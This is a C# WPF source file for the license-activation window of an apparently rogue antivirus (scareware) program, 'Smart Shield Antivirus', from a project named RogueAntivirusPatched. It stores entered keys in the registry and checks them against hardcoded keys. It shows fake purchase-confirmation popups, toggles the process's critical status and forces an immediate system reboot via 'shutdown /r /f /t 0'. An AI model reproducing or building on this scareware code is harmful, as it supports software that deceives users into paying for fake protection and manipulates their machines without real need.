using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.CompilerServices;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Data;
using System.Windows.Documents;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using System.Windows.Shapes;
using RogueAntivirusPatched.ViewModel;
using RogueAntivirusPatched.Model;
using System.Diagnostics;
using RogueAntivirusPatched.Global;
using RogueAntivirusPatched.Classes;

namespace RogueAntivirusPatched.View.Windows
{
    /// <summary>
    /// Interaction logic for LicenseWindow.xaml
    /// </summary>
    public partial class LicenseWindow : Window
    {
        private static readonly Regex digitsOnly = new Regex(@"^[0-9-]+$");
        private static bool wasFocused = false;
        private vmLicensePage _vmLicensePage;
        private Events events;
        public LicenseWindow()
        {
            InitializeComponent();
            _vmLicensePage = new vmLicensePage();
            DataContext = _vmLicensePage;
            events = new Events();

            events.popUpPublisher.popUpHandler += PopUpPublisher_popUpHandler;
        }

        private void PopUpPublisher_popUpHandler(object sender, Events.PopUpArgs e)
        {
            switch (e.popUpType)
            {
                case Events.PopUpArgs.PopUpType.LicenseInvalid:
                    break;

                case Events.PopUpArgs.PopUpType.LicenseValid:
                    break;
            }
        }

        private void TextBox_PreviewTextInput(object sender, TextCompositionEventArgs e)
        {
            e.Handled = !digitsOnly.IsMatch(e.Text);
        }

        private void TextBox_Pasting(object sender, DataObjectPastingEventArgs e)
        {
            if (e.DataObject.GetDataPresent(typeof(string)))
            {
                string text = (string)e.DataObject.GetData(typeof(string));
                if (!digitsOnly.IsMatch(text))
                {
                    e.CancelCommand();
                }
            }
            else
            {
                e.CancelCommand();
            }
        }
        private void TextBox_GotFocus(object sender, RoutedEventArgs e)
        {
            _vmLicensePage.ColorTextBox = new SolidColorBrush(Color.FromRgb(0, 0, 0));

            if (wasFocused)
                return;

            _vmLicensePage.ContentTextBox = "";
            wasFocused = true;
        }

        private void TextBox_LostFocus(object sender, RoutedEventArgs e)
        {
            _vmLicensePage.ColorTextBox = new SolidColorBrush(Color.FromRgb(100, 100, 100));
        }

        private void keyTextBox_PreviewKeyDown(object sender, KeyEventArgs e)
        {
            if (e.Key == Key.Back)
                return;

            if (keyTextBox.Text.Length == 4 || keyTextBox.Text.Length == 9 || keyTextBox.Text.Length == 14)
            {
                keyTextBox.Text += "-";
                keyTextBox.CaretIndex = keyTextBox.Text.Length;
            }
        }

        private void AntivateBtn_Click(object sender, MouseButtonEventArgs e)
        {
            var keySender = new KeySender();
            keySender.RegistrySetKey(keyTextBox.Text);

            bool isValidKey = IsKeyValid(keyTextBox.Text);

            if (!isValidKey)
            {
                string title = "License key";
                string subTitle = "The inserted key is not valid.";
                string text = "We are sorry, but this key is not valid for success activation." + Environment.NewLine +
                    "Please try it again or contact us via email.";
                var bitmap = Properties.Resources.blue_sad;
                var margin = new Thickness(0, 0, 0, 80);
                var sound = Properties.Resources.cry;
                events.ShowPopUp(Events.PopUpArgs.PopUpType.LicenseInvalid, title, subTitle, text, bitmap, margin, 500, 400, sound);

                TTS.SpeakInterrupted(TTS.TTSProperty.LicenseWin.invalidCode);
                _vmLicensePage.ContentKeyInsert = TTS.TTSProperty.LicenseWin.invalidCode;
                _vmLicensePage.IsVisibleKeyInsert = Visibility.Visible;
                _vmLicensePage.ColorKeyInsert = mGradient.RedFade();
                return;
            }

            if (true)
            {
                string title = "License key";
                string subTitle = "Activation successful";
                string text = "Thank you for purchasing the full version of Smart Shield Antivirus!" + Environment.NewLine +
                    "From this moment you can use all provided features of our software." + Environment.NewLine +
                    "If you have any questions, don't hesitate to contact us via our email.";
                var bitmap = Properties.Resources.blue_emoji_stars;
                var margin = new Thickness(0, 0, 0, 60);
                var width = 500;
                var height = 450;
                var sound = Properties.Resources.success;
                events.ShowPopUp(Events.PopUpArgs.PopUpType.LicenseInvalid, title, subTitle, text, bitmap, margin, width, height, sound);
            }

            TTS.SpeakInterrupted(TTS.TTSProperty.LicenseWin.validCode);
            _vmLicensePage.ContentKeyInsert = "Valid key detected!";
            _vmLicensePage.IsVisibleKeyInsert = Visibility.Visible;
            _vmLicensePage.ColorKeyInsert = mGradient.GreenGradient();
            _vmLicensePage.WindowTitle = "Activation status: active";

            var msgBox = MessageBox.Show("Thanks for the registration!" + Environment.NewLine + 
                "Please restart the computer to apply new changes." + Environment.NewLine +
                Environment.NewLine + "Do you want to restart the computer now?", 
                _vmLicensePage.WindowTitle, MessageBoxButton.YesNo, MessageBoxImage.Information);

            if (msgBox == MessageBoxResult.No)
                return;

            var shutdown = new SystemShutdown();
            shutdown.SetAppAsCritical(0);
            Process.Start("shutdown", "/r /f /t 0");
            Environment.Exit(0);
        }

        private bool IsKeyValid(string userKey)
        {
            foreach (string key in mLicenseKeys.licenseKeys)
            {
                if (key.Equals(userKey))
                    return true;
            }

            return false;
        }
    }
}
